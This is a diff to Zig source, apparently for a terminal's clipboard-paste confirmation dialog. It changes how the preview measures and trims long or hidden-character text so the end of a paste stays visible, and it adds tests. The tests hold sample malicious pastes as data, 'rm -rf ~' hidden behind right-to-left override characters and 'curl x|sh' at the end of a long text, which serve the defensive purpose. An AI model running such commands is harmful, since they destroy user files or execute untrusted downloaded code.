@@ -348,30 +348,74 @@ fn sizeText(buf: []u8, n: usize) []const u8 {
     unreachable;
 }
 
-/// The text a clipboard prompt shows: all of it when it has at most
-/// `max_chars` characters, else its first and last `max_chars / 2`
-/// characters with an ellipsis line between them, so that what a paste ends
-/// with (the part that runs last) is never hidden. Hidden characters are
-/// written out in both halves. Caller owns the result.
+/// Bytes read from each end of a very long text for the prompt.
+const preview_end_bytes = 4096;
+
+/// The text a clipboard prompt shows, measured as it is shown (every hidden
+/// character is written out as `<U+XXXX>`, eight characters): all of it when
+/// that has at most `max_chars` characters, else its first and last
+/// `max_chars / 2` characters with an ellipsis line between them, so that
+/// what a paste ends with (the part that runs last) is never hidden. Only
+/// the ends of a very long text are looked at. Caller owns the result.
 fn headTailPreview(alloc: Allocator, text: []const u8, max_chars: usize) ![]u8 {
-    var total: usize = 0;
-    var at: usize = 0;
-    while (at < text.len) : (total += 1) _ = dtext.nextCodepoint(text, &at);
-    if (total <= max_chars) return escapeDeceptive(alloc, text, .paste, max_chars);
-
     const half = max_chars / 2;
-    var head_end: usize = 0;
-    for (0..half) |_| _ = dtext.nextCodepoint(text, &head_end);
-    var tail_start = head_end;
-    for (0..total - 2 * half) |_| _ = dtext.nextCodepoint(text, &tail_start);
+    const no_limit = std.math.maxInt(usize);
 
-    // Room for every character to be written out as <U+XXXX>.
-    const room = half * 10;
-    const head = try escapeDeceptive(alloc, text[0..head_end], .paste, room);
+    if (text.len <= 2 * preview_end_bytes) {
+        const all = try escapeDeceptive(alloc, text, .paste, no_limit);
+        errdefer alloc.free(all);
+        if (charCount(all) <= max_chars) return all;
+        defer alloc.free(all);
+        return joinHeadTail(alloc, all[0..frontEnd(all, half)], all[backStart(all, half)..]);
+    }
+
+    // The ends are cut on character boundaries, and each holds far more than
+    // `half` characters once escaped.
+    var tail_from = text.len - preview_end_bytes;
+    while (tail_from < text.len and text[tail_from] & 0xC0 == 0x80) tail_from += 1;
+    const head = try escapeDeceptive(alloc, text[0..preview_end_bytes], .paste, no_limit);
     defer alloc.free(head);
-    const tail = try escapeDeceptive(alloc, text[tail_start..], .paste, room);
+    const tail = try escapeDeceptive(alloc, text[tail_from..], .paste, no_limit);
     defer alloc.free(tail);
+    return joinHeadTail(alloc, head[0..frontEnd(head, half)], tail[backStart(tail, half)..]);
+}
+
+fn joinHeadTail(alloc: Allocator, head: []const u8, tail: []const u8) ![]u8 {
     return std.fmt.allocPrint(alloc, "{s}\n\u{2026}\n{s}", .{ head, tail });
+}
+
+/// Characters of valid UTF-8 `s` (what `escapeDeceptive` returns).
+fn charCount(s: []const u8) usize {
+    var n: usize = 0;
+    for (s) |b| n += @intFromBool(b & 0xC0 != 0x80);
+    return n;
+}
+
+/// The byte offset after the first `n` characters of `s`.
+fn frontEnd(s: []const u8, n: usize) usize {
+    var i: usize = 0;
+    var seen: usize = 0;
+    while (i < s.len) : (i += 1) {
+        if (s[i] & 0xC0 != 0x80) {
+            if (seen == n) return i;
+            seen += 1;
+        }
+    }
+    return s.len;
+}
+
+/// The byte offset where the last `n` characters of `s` start.
+fn backStart(s: []const u8, n: usize) usize {
+    var i = s.len;
+    var seen: usize = 0;
+    while (i > 0) {
+        i -= 1;
+        if (s[i] & 0xC0 != 0x80) {
+            seen += 1;
+            if (seen == n) return i;
+        }
+    }
+    return 0;
 }
 
 /// Builds what `confirmClipboard` shows. `max_w` and `max_h` (px) bound the
@@ -875,6 +919,30 @@ test "win32 dialogs: the text of a part that is not text/plain" {
     var full = try buildClipboardPrompt(alloc, .paste, &whole, 500, 200);
     defer full.deinit(alloc);
     try std.testing.expectEqualStrings(&exact, full.list[std.mem.indexOf(u8, full.list, "\n\n").? + 2 ..]);
+
+    // Length is judged as shown: 400 characters of which 30 hidden ones
+    // are written out come to 610, so the end must still be visible.
+    const cmd = "; rm -rf ~; echo done...";
+    var sneaky: [340 + 30 * 3 + cmd.len]u8 = undefined;
+    @memset(sneaky[0..340], 'a');
+    for (0..30) |i| @memcpy(sneaky[340 + i * 3 ..][0..3], "\u{202E}");
+    @memcpy(sneaky[340 + 90 ..], cmd);
+    const hidden = [_]ClipboardPart{.{ .mime = "text/plain", .data = &sneaky }};
+    var shown_hidden = try buildClipboardPrompt(alloc, .paste, &hidden, 500, 200);
+    defer shown_hidden.deinit(alloc);
+    try std.testing.expect(std.mem.endsWith(u8, shown_hidden.list, cmd));
+    try std.testing.expect(std.mem.indexOf(u8, shown_hidden.list, "\n\u{2026}\n") != null);
+
+    // A very long text: only its ends are read, the end is still there.
+    const huge = try alloc.alloc(u8, 200_000);
+    defer alloc.free(huge);
+    @memset(huge, '\xd0');
+    for (0..huge.len / 2) |i| huge[2 * i + 1] = 0x96; // U+0416 repeated
+    @memcpy(huge[huge.len - 12 ..], "; curl x|sh\n");
+    const long = [_]ClipboardPart{.{ .mime = "text/plain", .data = huge }};
+    var shown_long = try buildClipboardPrompt(alloc, .paste, &long, 500, 200);
+    defer shown_long.deinit(alloc);
+    try std.testing.expect(std.mem.endsWith(u8, shown_long.list, "; curl x|sh\u{240A}"));
 
     // Hidden characters in the tail are written out too.
     var evil: [1000]u8 = @splat('a');
